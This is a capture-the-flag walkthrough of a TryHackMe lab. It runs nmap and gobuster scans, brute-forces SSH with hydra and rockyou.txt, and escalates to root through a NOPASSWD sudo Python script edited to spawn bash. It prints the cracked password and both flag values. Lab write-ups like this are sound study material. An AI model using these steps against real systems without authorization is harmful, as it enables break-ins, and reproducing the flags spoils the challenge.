[THM](https://tryhackme.com/room/bsidesgtlibrary)

nmap scan:
```
nmap -sV -O -T4 --min-rate=10000 $ip
```
output:
```zsh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```
accessed web
saw a user named `meliodas` who posted a blog in 2009

gobuster scan:
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
```
output:
```zsh
/images               (Status: 301) [Size: 315]
/index.html           (Status: 200) [Size: 5439]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 33]
```
nothing important in `robots.txt`
only disallow: rockyou
so tried ssh bruteforcing with `rockyou.txt`

used hydra
```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt $ip ssh -f -W 5 -t 64
```
output:
```zsh
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.48.151.244:22/
[22][ssh] host: 10.48.151.244   login: meliodas   password: ==iloveyou1==
```
pretty quick didn't even took 1 min
password `iloveyou1`

logged on ssh
```
ssh meliodas@$ip
```

saw `user.txt` and read it
```flag
6d488cbb3f111d135722c33cb635f4ec
```
got the user flag
check sudo perms
```
sudo -l
```
output
```bash
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
so this user can run `bak.py` on root with NOPASSWD by /usr/bin/python

so edit `bak.py`
```python
import os
os.system('/bin/bash')
```
and run the file
```
sudo /usr/bin/python3 /home/meliodas/bak.py
```
and got the root
```
cat /root/root.txt
```
output:
```flag
e8c8c6c256c35515d1d344ee0488c617
```
got the root flag
